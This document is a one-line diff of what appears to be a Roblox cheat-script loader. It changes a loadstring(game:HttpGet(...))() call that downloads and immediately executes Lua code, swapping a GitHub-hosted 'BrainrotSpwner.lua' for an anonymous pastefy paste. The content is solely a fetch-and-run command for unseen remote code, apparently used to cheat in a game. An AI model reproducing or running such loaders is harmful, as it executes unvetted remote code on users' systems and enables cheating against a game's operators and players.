@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/pro/refs/heads/main/BrainrotSpwner.lua"))()
+loadstring(game:HttpGet("https://pastefy.app/bgt2SCoG/raw", true))()
